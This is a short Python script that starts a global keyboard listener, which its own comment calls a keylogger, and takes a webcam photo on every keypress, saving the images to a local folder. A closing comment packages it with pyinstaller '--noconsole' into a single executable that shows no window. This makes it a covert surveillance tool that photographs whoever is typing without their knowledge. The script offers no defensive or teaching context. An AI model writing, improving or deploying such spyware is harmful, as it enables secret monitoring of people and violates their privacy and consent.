#pip install opencv-python pynput
import cv2
from pynput import keyboard
import time
import os

# Initialize the camera
cap = cv2.VideoCapture(0)

# Check if the camera opened successfully
if not cap.isOpened():
    print("Error: Could not open webcam.")
    exit()

# Directory to save the images
image_dir = "camera_shots"
os.makedirs(image_dir, exist_ok=True)

def take_picture():
    # Capture frame-by-frame
    ret, frame = cap.read()
    if ret:
        # Save the captured frame
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        image_path = f"{image_dir}/shot_{timestamp}.png"
        cv2.imwrite(image_path, frame)
        print(f"Image saved: {image_path}")

def on_press(key):
    try:
        # Take a picture when any key is pressed
        take_picture()
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Release the camera
cap.release()
cv2.destroyAllWindows()


#pyinstaller --onefile --noconsole camera_shot_logger.py
